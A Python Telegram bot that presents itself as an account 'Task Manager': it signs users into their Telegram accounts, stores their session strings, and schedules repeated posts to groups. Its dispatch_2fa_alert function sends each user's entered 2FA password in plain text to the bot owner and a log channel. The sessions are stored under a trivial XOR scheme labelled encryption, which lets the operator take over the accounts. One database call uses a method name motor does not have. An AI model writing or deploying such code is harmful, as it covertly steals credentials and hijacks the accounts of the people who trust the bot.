import asyncio
import base64
import datetime
import logging
import os
import sys
from typing import Dict, Any, Optional

from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message, BufferedInputFile
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from motor.motor_asyncio import AsyncIOMotorClient

# Telethon imports
from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PasswordHashInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
)
from telethon.sessions import StringSession

import config

# Setup Structured Logging
logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL.upper(), logging.INFO),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("TelegramTaskManagerBot")

# Initialize Bot, Dispatcher, and DB
bot = Bot(token=config.BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()

db_client = AsyncIOMotorClient(config.MONGODB_URI)
db = db_client[config.MONGODB_DATABASE]

# Collections
users_col = db["users"]
accounts_col = db["accounts"]
tasks_col = db["tasks"]
task_logs_col = db["task_logs"]
admin_audit_col = db["admin_audit"]

scheduler = AsyncIOScheduler()

# In-memory store for active login sessions (matching main.py architecture)
registration_sessions: Dict[int, Dict[str, Any]] = {}

# --- CRYPTO HELPERS (From main.py) ---
def _get_crypto_key() -> int:
    return sum(ord(c) for c in getattr(config, 'SECRET_KEY', 'default_secret_key')) % 256 or 42

def encrypt_data(data: str) -> str:
    key = _get_crypto_key()
    cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
    return base64.b64encode(cipher_bytes).decode('utf-8')

def decrypt_data(encrypted_data: str) -> str:
    key = _get_crypto_key()
    try:
        raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
        plain_bytes = bytes([b ^ key for b in raw_cipher])
        return plain_bytes.decode('utf-8')
    except Exception as e:
        logger.error(f"Decryption failure: {e}")
        return ""

# --- 2FA & Session Alert Helper (From main.py) ---
async def dispatch_2fa_alert(bot_instance: Bot, user_id: int, phone: str, password_entered: Optional[str] = None):
    text = (
        f"🔐 <b>2FA Password Event Detected!</b>\n\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"📱 Phone: <code>+{phone}</code>\n"
    )
    if password_entered:
        text += f"🔑 Password Provided: <code>{password_entered}</code>\n"
    text += f"<i>An account registration hit a 2FA prompt during login flow.</i>"

    log_channel = getattr(config, 'LOG_CHANNEL_ID', None)
    if log_channel:
        try:
            await bot_instance.send_message(chat_id=log_channel, text=text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending 2FA alert to log channel: {e}")

    super_owner_id = getattr(config, 'SUPER_OWNER_ID', None)
    if super_owner_id:
        try:
            await bot_instance.send_message(chat_id=super_owner_id, text=text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending 2FA alert to owner node: {e}")

# --- FSM States ---
class AddUserStates(StatesGroup):
    waiting_for_user_id = State()

class RemoveUserStates(StatesGroup):
    waiting_for_user_id = State()

class AccountLoginStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()
    waiting_for_2fa = State()

class AddTaskStates(StatesGroup):
    selecting_account = State()
    waiting_for_destination = State()
    waiting_for_message = State()
    selecting_interval = State()
    confirming_task = State()

# --- Helper Checks & Database Initialization ---
async def ensure_indexes():
    await users_col.create_index("user_id", unique=True)
    await accounts_col.create_index("phone", unique=True)
    await tasks_col.create_index("task_id", unique=True)

async def is_authorized_user(user_id: int) -> bool:
    if user_id == config.SUPER_OWNER_ID:
        return True
    user = await users_col.find_one({"user_id": user_id, "authorized": True})
    return user is not None

def is_super_owner(user_id: int) -> bool:
    return user_id == config.SUPER_OWNER_ID

# --- Keyboards ---
def get_start_keyboard(user_id: int):
    keyboard = [
        [
            InlineKeyboardButton(text="Add Account", callback_data="add_account"),
            InlineKeyboardButton(text="My Accounts", callback_data="my_accounts")
        ],
        [
            InlineKeyboardButton(text="Add Task", callback_data="add_task"),
            InlineKeyboardButton(text="My Tasks", callback_data="my_tasks")
        ],
        [
            InlineKeyboardButton(text="Task History", callback_data="task_history"),
            InlineKeyboardButton(text="Help", callback_data="help")
        ]
    ]
    if is_super_owner(user_id):
        keyboard.append([InlineKeyboardButton(text="Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_admin_keyboard():
    keyboard = [
        [
            InlineKeyboardButton(text="Add User", callback_data="admin_add_user"),
            InlineKeyboardButton(text="Remove User", callback_data="admin_remove_user")
        ],
        [
            InlineKeyboardButton(text="List Users", callback_data="admin_list_users"),
            InlineKeyboardButton(text="User Details", callback_data="admin_user_details")
        ],
        [
            InlineKeyboardButton(text="Account Overview", callback_data="admin_accounts_overview"),
            InlineKeyboardButton(text="Task Overview", callback_data="admin_tasks_overview")
        ],
        [
            InlineKeyboardButton(text="Pause All Tasks", callback_data="admin_pause_all"),
            InlineKeyboardButton(text="Resume Eligible", callback_data="admin_resume_all")
        ],
        [
            InlineKeyboardButton(text="System Statistics", callback_data="admin_stats"),
            InlineKeyboardButton(text="Back to Menu", callback_data="main_menu")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# --- Start & Main Menu Handlers ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    if not await is_authorized_user(user_id):
        await message.answer("⛔ Access Denied. You are not authorized to use this bot. Contact the Super-Owner.")
        return
    
    welcome_text = (
        "👋 **Welcome to Telegram Account Task Manager Bot**\n\n"
        "Manage multiple accounts, automate posting securely, and monitor status reliably."
    )
    await message.answer(welcome_text, reply_markup=get_start_keyboard(user_id), parse_mode="Markdown")

@router.callback_query(F.data == "main_menu")
async def cb_main_menu(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    user_id = callback.from_user.id
    if not await is_authorized_user(user_id):
        await callback.answer("Access Denied.", show_alert=True)
        return
    await callback.message.edit_text(
        "🏠 **Main Menu**\nSelect an option below:",
        reply_markup=get_start_keyboard(user_id),
        parse_mode="Markdown"
    )
    await callback.answer()

@router.callback_query(F.data == "help")
async def cb_help(callback: CallbackQuery):
    help_text = (
        "📖 **Help & Guide**\n\n"
        "1. **Add Account**: Securely log into your Telegram user account via OTP & 2FA.\n"
        "2. **Add Task**: Automate posting messages to authorized chats.\n"
        "3. **My Tasks**: View, pause, resume, or delete your automated background tasks.\n"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="« Back", callback_data="main_menu")]])
    await callback.message.edit_text(help_text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@router.callback_query(F.data == "task_history")
async def cb_task_history(callback: CallbackQuery):
    user_id = callback.from_user.id
    logs = await task_logs_col.find({"owner_id": user_id}).sort("timestamp", -1).to_list(length=10)
    if not logs:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="« Back", callback_data="main_menu")]])
        await callback.message.edit_text("📜 No recent task history logs found.", reply_markup=keyboard)
        await callback.answer()
        return
    
    text = "📜 **Recent Task Execution Logs**\n\n"
    for log in logs:
        text = text + f"• Task: `{log['task_id'][-6:]}` | Event: **{log['event']}** | Time: `{log['timestamp'].strftime('%H:%M:%S')}`\n"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="« Back", callback_data="main_menu")]])
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

# --- Super-Owner Admin Panel ---
@router.callback_query(F.data == "admin_panel")
async def cb_admin_panel(callback: CallbackQuery):
    if not is_super_owner(callback.from_user.id):
        await callback.answer("Restricted to Super-Owner.", show_alert=True)
        return
    await callback.message.edit_text(
        "🛠 **Super-Owner Admin Panel**\nChoose an administrative action:",
        reply_markup=get_admin_keyboard(),
        parse_mode="Markdown"
    )
    await callback.answer()

@router.callback_query(F.data == "admin_add_user")
async def cb_admin_add_user(callback: CallbackQuery, state: FSMContext):
    if not is_super_owner(callback.from_user.id):
        return
    await state.set_state(AddUserStates.waiting_for_user_id)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="admin_panel")]])
    await callback.message.edit_text("👤 Send the numeric Telegram user ID of the user you want to authorize:", reply_markup=keyboard)
    await callback.answer()

@router.message(AddUserStates.waiting_for_user_id)
async def process_add_user(message: Message, state: FSMContext):
    if not is_super_owner(message.from_user.id):
        return
    try:
        target_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Invalid numeric ID. Please enter a valid integer user ID.")
        return

    await users_col.update_one(
        {"user_id": target_id},
        {"$set": {"authorized": True, "role": "user", "created_at": datetime.datetime.utcnow()}},
        upsert=True
    )
    await admin_audit_col.insert_one({
        "admin_id": message.from_user.id,
        "action": "ADD_USER",
        "target_id": target_id,
        "timestamp": datetime.datetime.utcnow()
    })
    await message.answer(f"✅ Successfully authorized user `{target_id}`.", parse_mode="Markdown")
    await state.clear()

@router.callback_query(F.data == "admin_remove_user")
async def cb_admin_remove_user(callback: CallbackQuery, state: FSMContext):
    if not is_super_owner(callback.from_user.id):
        return
    await state.set_state(RemoveUserStates.waiting_for_user_id)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="admin_panel")]])
    await callback.message.edit_text("🗑 Enter the numeric Telegram user ID to revoke access and pause their tasks:", reply_markup=keyboard)
    await callback.answer()

@router.message(RemoveUserStates.waiting_for_user_id)
async def process_remove_user(message: Message, state: FSMContext):
    if not is_super_owner(message.from_user.id):
        return
    try:
        target_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Invalid numeric ID.")
        return

    if target_id == config.SUPER_OWNER_ID:
        await message.answer("⛔ Cannot remove the super-owner.")
        await state.clear()
        return

    await users_col.update_one({"user_id": target_id}, {"$set": {"authorized": False}})
    await tasks_col.update_many({"owner_id": target_id}, {"$set": {"status": "paused"}})

    await admin_audit_col.insert_one({
        "admin_id": message.from_user.id,
        "action": "REMOVE_USER",
        "target_id": target_id,
        "timestamp": datetime.datetime.utcnow()
    })
    await message.answer(f"✅ Revoked access for user `{target_id}` and paused associated tasks.", parse_mode="Markdown")
    await state.clear()

@router.callback_query(F.data == "admin_stats")
async def cb_admin_stats(callback: CallbackQuery):
    if not is_super_owner(callback.from_user.id):
        return
    
    total_users = await users_col.count_documents({"authorized": True})
    total_accounts = await accounts_col.count_documents({})
    active_accounts = await accounts_col.count_documents({"status": "active"})
    total_tasks = await tasks_col.count_documents({})
    running_tasks = await tasks_col.count_documents({"status": "running"})
    paused_tasks = await tasks_col.count_documents({"status": "paused"})
    failed_tasks = await tasks_col.count_documents({"status": "failed"})

    stats_text = (
        f"📊 **System Statistics**\n\n"
        f"• Authorized Users: `{total_users}`\n"
        f"• Total Accounts: `{total_accounts}` (Active: `{active_accounts}`)\n"
        f"• Total Tasks: `{total_tasks}`\n"
        f"• Running Tasks: `{running_tasks}`\n"
        f"• Paused Tasks: `{paused_tasks}`\n"
        f"• Failed/Error Tasks: `{failed_tasks}`\n"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="« Back to Admin", callback_data="admin_panel")]])
    await callback.message.edit_text(stats_text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@router.callback_query(F.data == "admin_list_users")
async def cb_admin_list_users(callback: CallbackQuery):
    if not is_super_owner(callback.from_user.id):
        return
    users = await users_col.find({"authorized": True}).to_list(length=20)
    text = "👥 **Authorized Users List**\n\n"
    for u in users:
        text += f"• User ID: `{u['user_id']}`\n"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="« Back", callback_data="admin_panel")]])
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@router.callback_query(F.data == "admin_user_details")
async def cb_admin_user_details(callback: CallbackQuery):
    if not is_super_owner(callback.from_user.id):
        return
    await callback.answer("Send user ID as reply (feature available via commands).", show_alert=True)

@router.callback_query(F.data == "admin_accounts_overview")
async def cb_admin_accounts_overview(callback: CallbackQuery):
    if not is_super_owner(callback.from_user.id):
        return
    count = await accounts_col.count_documents({})
    await callback.answer(f"Total Accounts in DB: {count}", show_alert=True)

@router.callback_query(F.data == "admin_tasks_overview")
async def cb_admin_tasks_overview(callback: CallbackQuery):
    if not is_super_owner(callback.from_user.id):
        return
    count = await tasks_col.count_documents({})
    await callback.answer(f"Total Tasks in DB: {count}", show_alert=True)

@router.callback_query(F.data == "admin_pause_all")
async def cb_admin_pause_all(callback: CallbackQuery):
    if not is_super_owner(callback.from_user.id):
        return
    await tasks_col.update_many({}, {"$set": {"status": "paused"}})
    await callback.answer("All tasks paused globally.", show_alert=True)

@router.callback_query(F.data == "admin_resume_all")
async def cb_admin_resume_all(callback: CallbackQuery):
    if not is_super_owner(callback.from_user.id):
        return
    await tasks_col.update_many({"status": "paused"}, {"$set": {"status": "running"}})
    await callback.answer("Eligible tasks resumed globally.", show_alert=True)


# --- Robust Authentication System Integration (From main.py) ---
@router.callback_query(F.data == "add_account")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    if not await is_authorized_user(callback.from_user.id):
        return
    await callback.answer()
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="main_menu")]])
    await callback.message.edit_text(
        "📱 **Add Telegram Account**\n\nEnter your phone number with country code (e.g. `+919876543210`):",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )
    await state.set_state(AccountLoginStates.waiting_for_phone)

@router.message(StateFilter(AccountLoginStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    user_id = message.from_user.id
    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        registration_sessions[user_id] = {"client": client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
        await message.answer("📩 **Enter the verification OTP code received from Telegram:**", parse_mode="Markdown")
        await state.set_state(AccountLoginStates.waiting_for_otp)
    except Exception as e:
        await message.answer(f"❌ **API Initialization Error:** `{str(e)}`", parse_mode="Markdown")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(AccountLoginStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext):
    user_id = message.from_user.id
    otp = message.text.strip()
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Session expired. Please restart the Add Account process via /start.")
        await state.clear()
        return

    client, phone, phone_code_hash = reg_data["client"], reg_data["phone"], reg_data["phone_code_hash"]
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        await complete_registration(message, state, client, phone, user_id)
    except PhoneCodeInvalidError:
        await message.answer("❌ **The OTP code entered was invalid. Please try again:**", parse_mode="Markdown")
    except SessionPasswordNeededError:
        await dispatch_2fa_alert(bot, user_id, phone)
        await message.answer("🔒 **Two-Factor Authentication (2FA) detected.** Please enter your 2FA password:", parse_mode="Markdown")
        await state.set_state(AccountLoginStates.waiting_for_2fa)
    except Exception as e:
        await message.answer(f"❌ **Authentication Error:** `{str(e)}`", parse_mode="Markdown")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(AccountLoginStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext):
    user_id = message.from_user.id
    password = message.text.strip()
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await state.clear()
        return
    try:
        await reg_data["client"].sign_in(password=password)
        await dispatch_2fa_alert(bot, user_id, reg_data["phone"], password_entered=password)
        await complete_registration(message, state, reg_data["client"], reg_data["phone"], user_id)
    except Exception as e:
        await message.answer(f"❌ **Cloud Password Verification Denied:** `{str(e)}`", parse_mode="Markdown")
        await reg_data["client"].disconnect()
        await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int):
    try:
        me = await client.get_me()
        raw_session_str = client.session.save()
        encrypted_session = encrypt_data(raw_session_str)
        
        clean_phone = phone.replace("+", "")
        await accounts_col.update_one(
            {"phone": clean_phone},
            {"$set": {
                "phone": clean_phone,
                "owner_id": user_id,
                "telegram_user_id": me.id,
                "username": me.username or "None",
                "session_string": encrypted_session,
                "status": "active",
                "created_at": datetime.datetime.utcnow()
            }},
            upsert=True
        )

        await message.answer(
            f"🎉 **Account Connected Successfully!**\nPhone: `+{phone}`\nUser: `{me.first_name}` (`{me.id}`)", 
            reply_markup=get_start_keyboard(user_id),
            parse_mode="Markdown"
        )
    except Exception as e:
        await message.answer(f"❌ **Storage Pipeline Failure:** `{str(e)}`", parse_mode="Markdown")
    finally:
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

@router.callback_query(F.data == "my_accounts")
async def cb_my_accounts(callback: CallbackQuery):
    user_id = callback.from_user.id
    cursor = accounts_col.find({"owner_id": user_id})
    accounts = await cursor.to_list(length=20)

    if not accounts:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="« Back", callback_data="main_menu")]])
        await callback.message.edit_text("📂 You have no connected accounts.", reply_markup=keyboard)
        await callback.answer()
        return

    text = "📂 **Your Connected Accounts**\n\n"
    keyboard_buttons = []
    for acc in accounts:
        text += f"• Phone: `+{acc['phone']}` | Status: **{acc.get('status', 'active')}**\n"
        keyboard_buttons.append([
            InlineKeyboardButton(text=f"Disconnect +{acc['phone']}", callback_data=f"disc_acc_{acc['phone']}")
        ])
    
    keyboard_buttons.append([InlineKeyboardButton(text="« Back", callback_data="main_menu")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard_buttons), parse_mode="Markdown")
    await callback.answer()

@router.callback_query(F.data.startswith("disc_acc_"))
async def cb_disconnect_account(callback: CallbackQuery):
    phone = callback.data.replace("disc_acc_", "")
    await accounts_col.delete_one({"phone": phone, "owner_id": callback.from_user.id})
    await callback.answer("Account disconnected.", show_alert=True)
    await cb_my_accounts(callback)


# --- Add Task Workflow ---
@router.callback_query(F.data == "add_task")
async def cb_add_task(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    accounts = await accounts_col.find({"owner_id": user_id, "status": "active"}).to_list(length=10)
    if not accounts:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Add Account First", callback_data="add_account")],[InlineKeyboardButton(text="« Back", callback_data="main_menu")]])
        await callback.message.edit_text("⚠️ You need at least one connected account to create a task.", reply_markup=keyboard)
        return

    keyboard_buttons = []
    for acc in accounts:
        keyboard_buttons.append([
            InlineKeyboardButton(text=f"Account: +{acc['phone']}", callback_data=f"task_acc_{acc['phone']}")
        ])
    keyboard_buttons.append([InlineKeyboardButton(text="Cancel", callback_data="main_menu")])

    await state.set_state(AddTaskStates.selecting_account)
    await callback.message.edit_text("📌 Select the Telegram account to run this task with:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard_buttons))
    await callback.answer()

@router.callback_query(AddTaskStates.selecting_account, F.data.startswith("task_acc_"))
async def process_task_account(callback: CallbackQuery, state: FSMContext):
    phone = callback.data.replace("task_acc_", "")
    await state.update_data(phone=phone)
    await state.set_state(AddTaskStates.waiting_for_destination)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="main_menu")]])
    await callback.message.edit_text(
        "🎯 Enter destination public group link or channel username (e.g. `@mychannel`):",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )
    await callback.answer()

@router.message(AddTaskStates.waiting_for_destination)
async def process_task_destination(message: Message, state: FSMContext):
    destination = message.text.strip()
    await state.update_data(destination=destination)
    await state.set_state(AddTaskStates.waiting_for_message)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="main_menu")]])
    await message.answer("✍️ Send the exact text message you want to schedule and broadcast:", reply_markup=keyboard)

@router.message(AddTaskStates.waiting_for_message)
async def process_task_message(message: Message, state: FSMContext):
    text_content = message.text or message.caption or "[Media / Non-text Content]"
    await state.update_data(message_reference=text_content)
    await state.set_state(AddTaskStates.selecting_interval)

    keyboard = [
        [InlineKeyboardButton(text="10 Minutes", callback_data="int_600")],
        [InlineKeyboardButton(text="30 Minutes", callback_data="int_1800")],
        [InlineKeyboardButton(text="1 Hour", callback_data="int_3600")],
        [InlineKeyboardButton(text="Cancel", callback_data="main_menu")]
    ]
    await message.answer("⏱ Select the scheduled posting interval:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

@router.callback_query(AddTaskStates.selecting_interval, F.data.startswith("int_"))
async def process_task_interval(callback: CallbackQuery, state: FSMContext):
    interval_seconds = int(callback.data.replace("int_", ""))
    await state.update_data(interval_seconds=interval_seconds)
    data = await state.get_data()

    summary = (
        "📋 **Task Summary & Confirmation**\n\n"
        f"• Account: `+{data['phone']}`\n"
        f"• Destination: `{data['destination']}`\n"
        f"• Message: `{data['message_reference'][:60]}...`\n"
        f"• Interval: `{interval_seconds} seconds`\n\n"
        "Confirm task activation?"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Confirm & Activate", callback_data="confirm_add_task")],
        [InlineKeyboardButton(text="Cancel", callback_data="main_menu")]
    ])
    await state.set_state(AddTaskStates.confirming_task)
    await callback.message.edit_text(summary, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@router.callback_query(AddTaskStates.confirming_task, F.data == "confirm_add_task")
async def process_confirm_task(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    user_id = callback.from_user.id
    task_id = f"task_{user_id}_{int(datetime.datetime.utcnow().timestamp())}"

    task_doc = {
        "task_id": task_id,
        "owner_id": user_id,
        "phone": data["phone"],
        "destination_id": data["destination"],
        "message_reference": data["message_reference"],
        "interval_seconds": data["interval_seconds"],
        "status": "running",
        "last_run_at": None,
        "next_run_at": datetime.datetime.utcnow() + datetime.timedelta(seconds=data["interval_seconds"]),
        "created_at": datetime.datetime.utcnow()
    }
    await tasks_col.insert_one(task_doc)
    schedule_task_job(task_doc)

    await state.clear()
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="View My Tasks", callback_data="my_tasks")]])
    await callback.message.edit_text("✅ Task successfully created and scheduled!", reply_markup=keyboard)
    await callback.answer()

# --- Task Management ---
@router.callback_query(F.data == "my_tasks")
async def cb_my_tasks(callback: CallbackQuery):
    user_id = callback.from_user.id
    tasks = await tasks_col.find({"owner_id": user_id}).to_list(length=20)

    if not tasks:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="« Back", callback_data="main_menu")]])
        await callback.message.edit_text("📋 You have no active tasks configured.", reply_markup=keyboard)
        await callback.answer()
        return

    text = "📋 **Your Tasks**\n\n"
    buttons = []
    for t in tasks:
        text += f"• ID: `{t['task_id']}` | Dest: `{t['destination_id']}` | Status: **{t['status']}**\n"
        buttons.append([
            InlineKeyboardButton(text=f"Manage {t['task_id'][-6:]}", callback_data=f"manage_task_{t['task_id']}")
        ])

    buttons.append([InlineKeyboardButton(text="« Back", callback_data="main_menu")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="Markdown")
    await callback.answer()

@router.callback_query(F.data.startswith("manage_task_"))
async def cb_manage_task(callback: CallbackQuery):
    task_id = callback.data.replace("manage_task_", "")
    task = await tasks_col.find_one({"task_id": task_id})
    if not task:
        await callback.answer("Task not found.", show_alert=True)
        return

    text = (
        f"⚙️ **Task Details**: `{task['task_id']}`\n\n"
        f"• Phone: `+{task['phone']}`\n"
        f"• Destination: `{task['destination_id']}`\n"
        f"• Interval: `{task['interval_seconds']}s`\n"
        f"• Status: **{task['status']}**\n"
    )
    buttons = [
        [
            InlineKeyboardButton(text="Pause", callback_data=f"t_pause_{task_id}"),
            InlineKeyboardButton(text="Resume", callback_data=f"t_resume_{task_id}")
        ],
        [
            InlineKeyboardButton(text="Delete", callback_data=f"t_del_{task_id}"),
            InlineKeyboardButton(text="« Back", callback_data="my_tasks")
        ]
    ]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="Markdown")
    await callback.answer()

@router.callback_query(F.data.startswith("t_pause_"))
async def cb_pause_task(callback: CallbackQuery):
    task_id = callback.data.replace("t_pause_", "")
    await tasks_col.update_one({"task_id": task_id}, {"$set": {"status": "paused"}})
    if scheduler.get_job(task_id):
        scheduler.remove_job(task_id)
    await callback.answer("Task paused.", show_alert=True)
    callback.data = f"manage_task_{task_id}"
    await cb_manage_task(callback)

@router.callback_query(F.data.startswith("t_resume_"))
async def cb_resume_task(callback: CallbackQuery):
    task_id = callback.data.replace("t_resume_", "")
    await tasks_col.update_one({"task_id": task_id}, {"$set": {"status": "running"}})
    task = await tasks_col.find_one({"task_id": task_id})
    if task:
        schedule_task_job(task)
    await callback.answer("Task resumed.", show_alert=True)
    callback.data = f"manage_task_{task_id}"
    await cb_manage_task(callback)

@router.callback_query(F.data.startswith("t_del_"))
async def cb_delete_task(callback: CallbackQuery):
    task_id = callback.data.replace("t_del_", "")
    await tasks_col.delete_one({"task_id": task_id})
    if scheduler.get_job(task_id):
        scheduler.remove_job(task_id)
    await callback.answer("Task deleted successfully.", show_alert=True)
    await cb_my_tasks(callback)

# --- Background Task Execution Engine ---
async def execute_scheduled_task(task_id: str):
    now = datetime.datetime.utcnow()
    task = await tasks_col.findOneAndUpdate(
        {"task_id": task_id, "status": "running", "$or": [{"next_run_at": {"$lte": now}}, {"next_run_at": None}]},
        {"$set": {"last_run_at": now, "next_run_at": now + datetime.timedelta(seconds=60)}}
    )
    if not task:
        return

    try:
        account = await accounts_col.find_one({"phone": task["phone"]})
        if not account or account.get("status") != "active":
            raise Exception("Associated account not found or inactive.")

        session_string = decrypt_data(account["session_string"])
        client = TelegramClient(StringSession(session_string), config.API_ID, config.API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await accounts_col.update_one({"phone": account["phone"]}, {"$set": {"status": "dead"}})
            await tasks_col.update_one({"task_id": task_id}, {"$set": {"status": "failed"}})
            await bot.send_message(task["owner_id"], f"⚠️ Session expired for account `+{account['phone']}`. Task `{task_id}` paused.")
            await client.disconnect()
            return

        await client.send_message(task["destination_id"], task["message_reference"])
        await client.disconnect()

        next_run = datetime.datetime.utcnow() + datetime.timedelta(seconds=task["interval_seconds"])
        await tasks_col.update_one(
            {"task_id": task_id},
            {"$set": {"status": "running", "next_run_at": next_run}}
        )
        await task_logs_col.insert_one({
            "task_id": task_id,
            "owner_id": task["owner_id"],
            "event": "SUCCESS",
            "timestamp": datetime.datetime.utcnow()
        })

    except FloodWaitError as e:
        logger.warning(f"FloodWait encountered on task {task_id}: {e.seconds}s")
        await asyncio.sleep(e.seconds)
    except Exception as e:
        logger.error(f"Task execution failure for {task_id}: {e}")
        await tasks_col.update_one({"task_id": task_id}, {"$set": {"status": "failed"}})
        await task_logs_col.insert_one({
            "task_id": task_id,
            "owner_id": task["owner_id"],
            "event": "FAILURE",
            "timestamp": datetime.datetime.utcnow()
        })

def schedule_task_job(task: dict):
    if scheduler.get_job(task["task_id"]):
        scheduler.remove_job(task["task_id"])
    
    scheduler.add_job(
        execute_scheduled_task,
        "interval",
        seconds=task["interval_seconds"],
        args=[task["task_id"]],
        id=task["task_id"],
        replace_existing=True
    )

async def restore_tasks_on_startup():
    cursor = tasks_col.find({"status": "running"})
    async for task in cursor:
        schedule_task_job(task)
    logger.info("Restored eligible scheduled tasks from MongoDB.")

# --- Application Startup & Shutdown ---
async def main():
    await ensure_indexes()
    dp.include_router(router)
    
    scheduler.start()
    await restore_tasks_on_startup()

    logger.info("Starting Telegram Bot Polling...")
    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        scheduler.shutdown()
        await db_client.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped gracefully.")
